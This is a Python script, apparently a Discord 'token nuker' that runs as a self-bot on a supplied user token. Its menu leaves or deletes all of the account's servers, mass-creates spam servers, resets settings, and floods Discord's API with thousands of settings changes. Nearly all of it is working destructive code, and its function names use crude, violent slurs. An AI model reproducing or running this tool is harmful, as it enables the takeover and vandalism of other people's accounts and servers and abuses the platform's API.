import discord
from discord.ext import commands
from discord.ext import tasks
import colorama 
import random
import string
import asyncio
from colorama import Fore 
import requests
import time
import os 
import json
bot = commands.Bot(command_prefix="!", self_bot=True)
bot.remove_command("help")

## this mad me hard ##
colorama.init()
with open('config.json') as f:
    data = json.load(f)
    token = data["TOKEN"]


def tokenfuck():
      headers = {
      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
      'Content-Type': 'application/json',
      'Authorization': token,
      }
      payload = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          'status': "idle"
      }
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
      to_back()

def sezuire():
    headers = {
      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
      'Content-Type': 'application/json',
      'Authorization': token,
      }
    payload = {
      'theme': "dark"
      }
    payload2 = {
      'theme': "light"
      }
    for i in range(1000):
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
      requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
    to_back()

def langrape():
    headers = {
      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
      'Content-Type': 'application/json',
      'Authorization': token,
      }
    payload1 = {
          'locale': "ro"
      }
    payload2 = {
          'locale': "ja"
      }
    payload3 = {
          'locale': "fr"
      }
    for i in range(1000):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload1)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
    to_back()

def statusrape():
      headers = {
      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
      'Content-Type': 'application/json',
      'Authorization': token,
      }
      payload = {
          'status': "dnd"
      }
      payload2 = {
          'status': "idle"
      }
      payload3 = {
          'status': "invisible"
      } 
      payload4 = {
          'status': "online"
      }
      for i in range(1000):
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload4)
      to_back()

def serverspam():
    servername = input("ServerName>>")
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
    'Content-Type': 'application/json',
    'Authorization': token,
    }
    guild = {
    'name': f"{servername}"
    }
    for i in range(100):
     requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
     print(f"{Fore.GREEN}[+] {Fore.RED} Created Server Named {Fore.WHITE}{servername}")
    to_back()
    



@bot.event
async def on_ready():   
  print(f'''
  {Fore.RED}         oAaron Token Fuck Loader 
  {Fore.RED}
  {Fore.RED}         [1] Leave Guilds
  {Fore.RED}         [2] Delete All Guilds
  {Fore.RED}         [3] Go To Main Nuker
  {Fore.RED}
  ''')
  shit = input(">>")
  if shit == '1':
   for times in range(100):
    for guild in bot.guilds:
     server = bot.get_guild(guild.id)
     print(f"{Fore.GREEN}[+] Left Guild {Fore.RED} {server}")
     await server.leave() 
    to_back()
  if shit == '2':
   for times in range(100):
    for guild in bot.guilds:
     server = bot.get_guild(guild.id)
     print(f"{Fore.GREEN}[+] Deleted Server {Fore.RED} {server}")
     await server.delete() 
    to_back()
  if shit == '3':
      to_back()

def to_back():
 HomeScreen()
def HomeScreen():
  os.system('cls')
  print(f'''
  {Fore.RED}
  {Fore.RED}         ▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █                   
  {Fore.RED}         ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █                   
  {Fore.RED}         ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒                  
  {Fore.RED}         ░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒                  
  {Fore.RED}          ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░                  
  {Fore.RED}         ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒                   
  {Fore.RED}        ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░                  
  {Fore.RED}        ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░                   
  {Fore.RED}           ░ ░  ░  ░      ░  ░         ░                   
  {Fore.RED}                                                            
  {Fore.RED}       █████▒█    ██  ▄████▄   ██ ▄█▀▓█████  ██▀███               
  {Fore.RED}        ▓██   ▒ ██  ▓██▒▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒             
  {Fore.RED}        ▒████ ░▓██  ▒██░▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒             
  {Fore.RED}        ░▓█▒  ░▓▓█  ░██░▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄               
  {Fore.RED}        ░▒█░   ▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒             
  {Fore.RED}         ▒ ░   ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░             
  {Fore.RED}    ░     ░░▒░ ░ ░   ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░             
  {Fore.RED}   ░ ░    ░░░ ░ ░ ░        ░ ░░ ░    ░     ░░   ░              
  {Fore.RED}          ░     ░ ░      ░  ░      ░  ░   ░   
  {Fore.RED}
  {Fore.RED}
  {Fore.RED}
  {Fore.RED}                By oAaron#0001
  {Fore.RED}               [1]  serverspam
  {Fore.RED}               [2]  tokenfuck
  {Fore.RED}               [3]  sezuire 
  {Fore.RED}               [4]  langrape
  {Fore.RED}               [5]  statusrape
  ''')
  shit = input(">>")
  if shit == '1':
    serverspam()
  if shit == '2':
      tokenfuck()
  if shit == '3':
      sezuire()
  if shit == '4':
      langrape() 
  if shit == '5':
     statusrape()





bot.run(token, bot = False)